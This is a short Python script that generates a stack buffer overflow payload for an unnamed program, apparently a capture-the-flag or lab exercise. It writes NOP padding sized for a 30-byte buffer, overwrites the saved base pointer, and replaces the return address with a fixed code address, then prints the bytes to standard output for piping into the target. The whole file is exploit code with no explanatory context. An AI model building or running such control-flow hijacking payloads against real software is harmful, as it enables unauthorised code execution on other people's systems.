#!/usr/bin/python

import struct
import sys

buffsize = 30

padding = b'\x90'*(buffsize+2)
ebp = b'\x90'*8
eip = b'\x36\x11\x40'

sys.stdout.buffer.write(padding+ebp+eip)
